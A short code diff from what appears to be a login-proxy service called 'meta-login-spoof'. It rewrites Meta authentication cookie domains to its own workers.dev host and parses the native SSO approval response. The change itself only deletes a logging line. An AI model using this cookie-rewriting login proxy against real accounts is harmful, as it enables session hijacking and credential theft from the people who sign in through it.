@@ -59,8 +59,6 @@ app.post("*", async ( req ) => {
 		proxyResHeaders["set-cookie"] = proxyResHeaders["set-cookie"].replaceAll(".auth.meta.com", "meta-login-spoof.phaze.workers.dev");
 
 	if(url.pathname === '/api/native_sso/approved/'){
-		console.log(body);
-
 		let val = JSON.parse(body.replace("for (;;);", ""));
 
 		let url = new URL(val.payload.uri);
